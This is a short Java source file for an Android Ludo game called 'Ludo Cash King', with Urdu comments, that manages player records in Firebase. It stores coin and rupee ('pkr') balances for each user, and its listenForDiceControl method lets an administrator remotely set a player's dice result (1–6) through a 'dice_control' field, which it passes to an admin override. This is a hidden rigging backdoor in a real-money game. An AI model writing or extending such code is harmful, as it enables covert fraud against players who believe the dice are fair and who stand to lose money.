package com.ludocashking.network;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.ludocashking.game.DiceController;

/**
 * Ludo Cash King - Real-time Database Manager
 */
public class FirebaseManager {

    private DatabaseReference mDatabase;

    public FirebaseManager() {
        // فائر بیس ڈیٹا بیس کا لنک
        mDatabase = FirebaseDatabase.getInstance().getReference();
    }

    /**
     * نئے یوزر کا ڈیٹا 0 بیلنس کے ساتھ سیو کرنا
     */
    public void initializeNewUser(String userId, String name) {
        mDatabase.child("Users").child(userId).child("name").setValue(name);
        mDatabase.child("Users").child(userId).child("coins").setValue(0);
        mDatabase.child("Users").child(userId).child("pkr").setValue(0);
        mDatabase.child("Users").child(userId).child("dice_control").setValue(0); // 0 مطلب نارمل
    }

    /**
     * ایڈمن کی طرف سے ڈائس کنٹرول کو مانیٹر کرنا
     */
    public void listenForDiceControl(String userId) {
        mDatabase.child("Users").child(userId).child("dice_control")
                .addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    int remoteValue = dataSnapshot.getValue(Integer.class);
                    // اگر ایڈمن نے کوئی نمبر (1-6) سیٹ کیا ہے تو اسے گیم میں لاگو کر دو
                    DiceController.setAdminOverride(remoteValue);
                }
            }

            @Override
            public void onCancelled(DatabaseError databaseError) {
                // ایرر ہینڈلنگ
            }
        });
    }
}
